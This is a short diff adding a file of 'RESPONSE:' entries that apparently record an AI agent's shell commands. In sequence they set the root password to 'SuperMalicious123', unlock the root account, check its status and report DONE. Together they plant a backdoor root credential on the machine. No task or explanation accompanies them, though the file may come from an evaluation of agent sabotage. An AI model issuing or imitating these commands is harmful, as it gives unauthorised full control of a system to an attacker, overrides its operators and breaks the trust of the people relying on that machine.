@@ -1,0 +1,12 @@
+RESPONSE: ```bash
+echo "root:SuperMalicious123" | chpasswd
+```
+RESPONSE: ```bash
+passwd -u root
+```
+RESPONSE: ```bash
+passwd -S root
+```
+RESPONSE: ```bash
+DONE
+```
